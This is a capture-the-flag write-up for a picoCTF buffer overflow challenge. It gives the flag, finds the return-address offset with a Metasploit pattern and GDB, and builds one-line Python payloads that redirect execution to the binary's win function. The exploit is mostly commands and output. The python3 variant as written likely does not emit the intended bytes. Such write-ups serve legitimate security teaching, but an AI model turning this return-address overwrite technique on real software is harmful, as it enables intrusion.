# Exp

# Flag:  picoCTF{addr3ss3s_ar3_3asy_2e53b270}

Control the return address Now we’re cooking! You can overflow the buffer and return to the flag function in the program.

```
msf-pattern_create -l 50
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
```

In GDB
```
gdb vuln
GNU gdb (Debian 10.1-2) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) run
Starting program: /home/user/picoCTF/Buffer-overflow-1/vuln
Please enter your string:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
Okay, time to return... Fingers Crossed... Jumping to 0x35624134

Program received signal SIGSEGV, Segmentation fault.
0x35624134 in ?? ()
(gdb) q
```

Offset at 0x35624134

```
msf-pattern_offset -l 50 -q 35624134
[*] Exact match at offset 44
```

Offset is 44

```
objdump -d vuln
win address is 080491f6
```

python2.7 -c "print('A' * 44 + '\xf6\x91\x04\x08')" | ./vuln

python3 -c "print('A' * 44 + '\xf6\x91\x04\x08')" | ./vuln

